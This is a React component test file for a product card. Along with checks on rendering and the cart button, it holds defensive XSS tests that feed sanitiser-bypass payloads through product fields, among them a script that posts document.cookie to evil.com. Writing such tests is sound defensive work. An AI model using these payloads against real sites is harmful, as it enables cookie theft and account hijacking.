import { describe, it, expect, vi } from 'vitest'
import { render, screen } from '@testing-library/react'
import { userEvent } from '@testing-library/user-event'
import { ProductCard } from './ProductCard'
import type { Product } from '@shared/types'

describe('ProductCard', () => {
  const mockProduct: Product = {
    id: '1',
    name: 'Laptop',
    description: 'High-performance laptop',
    price: 999.99,
    emoji: '💻'
  }

  it('should render product name', () => {
    render(<ProductCard product={mockProduct} onAddToCart={vi.fn()} />)
    expect(screen.getByText('Laptop')).toBeInTheDocument()
  })

  it('should render product description', () => {
    render(<ProductCard product={mockProduct} onAddToCart={vi.fn()} />)
    expect(screen.getByText('High-performance laptop')).toBeInTheDocument()
  })

  it('should render product emoji', () => {
    render(<ProductCard product={mockProduct} onAddToCart={vi.fn()} />)
    expect(screen.getByText('💻')).toBeInTheDocument()
  })

  it('should render formatted price', () => {
    render(<ProductCard product={mockProduct} onAddToCart={vi.fn()} />)
    expect(screen.getByText('$999.99')).toBeInTheDocument()
  })

  it('should render add to cart button', () => {
    render(<ProductCard product={mockProduct} onAddToCart={vi.fn()} />)
    expect(screen.getByRole('button', { name: /add to cart/i })).toBeInTheDocument()
  })

  it('should call onAddToCart when button is clicked', async () => {
    const user = userEvent.setup()
    const onAddToCart = vi.fn()
    render(<ProductCard product={mockProduct} onAddToCart={onAddToCart} />)

    const button = screen.getByRole('button', { name: /add to cart/i })
    await user.click(button)

    expect(onAddToCart).toHaveBeenCalledWith(mockProduct)
    expect(onAddToCart).toHaveBeenCalledTimes(1)
  })

  describe('XSS Prevention (Security)', () => {
    it('should sanitize product name with script tag', () => {
      const maliciousProduct: Product = {
        ...mockProduct,
        name: '<script>alert("XSS")</script>Hacked Product',
      }

      render(<ProductCard product={maliciousProduct} onAddToCart={vi.fn()} />)

      // Script tag should be removed by DOMPurify
      const productName = screen.getByRole('heading', { level: 3 })
      expect(productName.innerHTML).not.toContain('<script>')
      expect(productName.innerHTML).not.toContain('alert')
      expect(productName.textContent).toBe('Hacked Product')
    })

    it('should sanitize product name with img onerror attack', () => {
      const maliciousProduct: Product = {
        ...mockProduct,
        name: '<img src=x onerror="alert(1)">Hacked Product',
      }

      render(<ProductCard product={maliciousProduct} onAddToCart={vi.fn()} />)

      // onerror event should be removed
      const productName = screen.getByRole('heading', { level: 3 })
      expect(productName.innerHTML).not.toContain('onerror')
      expect(productName.innerHTML).not.toContain('alert(1)')
    })

    it('should sanitize product description with malicious code', () => {
      const maliciousProduct: Product = {
        ...mockProduct,
        description: 'Safe description<script>fetch("https://evil.com", {method: "POST", body: document.cookie})</script>',
      }

      render(<ProductCard product={maliciousProduct} onAddToCart={vi.fn()} />)

      // Script should be removed
      const description = screen.getByText(/safe description/i)
      expect(description.innerHTML).not.toContain('<script>')
      expect(description.innerHTML).not.toContain('fetch')
      expect(description.innerHTML).not.toContain('evil.com')
    })

    it('should allow safe HTML formatting in description', () => {
      const productWithFormatting: Product = {
        ...mockProduct,
        description: 'This is <strong>bold</strong> and <em>italic</em> text',
      }

      render(<ProductCard product={productWithFormatting} onAddToCart={vi.fn()} />)

      // Safe HTML tags should be preserved by DOMPurify
      const description = screen.getByText(/this is/i)
      expect(description.innerHTML).toContain('<strong>bold</strong>')
      expect(description.innerHTML).toContain('<em>italic</em>')
    })

    it('should sanitize product name with iframe injection', () => {
      const maliciousProduct: Product = {
        ...mockProduct,
        name: '<iframe src="https://evil.com"></iframe>Hacked Product',
      }

      render(<ProductCard product={maliciousProduct} onAddToCart={vi.fn()} />)

      // iframe should be removed
      const productName = screen.getByRole('heading', { level: 3 })
      expect(productName.innerHTML).not.toContain('<iframe')
      expect(productName.innerHTML).not.toContain('evil.com')
      expect(productName.textContent).toBe('Hacked Product')
    })

    it('should sanitize product name with event handlers', () => {
      const maliciousProduct: Product = {
        ...mockProduct,
        name: '<div onclick="alert(1)">Hacked Product</div>',
      }

      render(<ProductCard product={maliciousProduct} onAddToCart={vi.fn()} />)

      // Event handlers should be removed
      const productName = screen.getByRole('heading', { level: 3 })
      expect(productName.innerHTML).not.toContain('onclick')
      expect(productName.innerHTML).not.toContain('alert(1)')
    })

    it('should sanitize product description with javascript: protocol', () => {
      const maliciousProduct: Product = {
        ...mockProduct,
        description: '<a href="javascript:alert(1)">Click me</a>',
      }

      render(<ProductCard product={maliciousProduct} onAddToCart={vi.fn()} />)

      // javascript: protocol should be removed
      const description = screen.getByText(/click me/i)
      // eslint-disable-next-line sonarjs/code-eval
      expect(description.innerHTML).not.toContain('javascript:')
      expect(description.innerHTML).not.toContain('alert(1)')
    })
  })
})
